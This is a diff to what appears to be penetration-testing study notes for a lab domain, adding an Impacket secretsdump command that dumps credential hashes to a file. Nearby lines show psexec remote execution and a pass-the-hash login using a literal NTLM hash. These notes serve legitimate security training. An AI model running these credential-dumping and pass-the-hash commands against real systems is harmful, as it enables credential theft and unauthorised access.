@@ -126,6 +126,10 @@ net accounts
 ```
 impacket-psexec offsec.local/allison@192.168.151.59
 ```
+###### Secretsdump.py
+```
+./secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
+```
 ###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
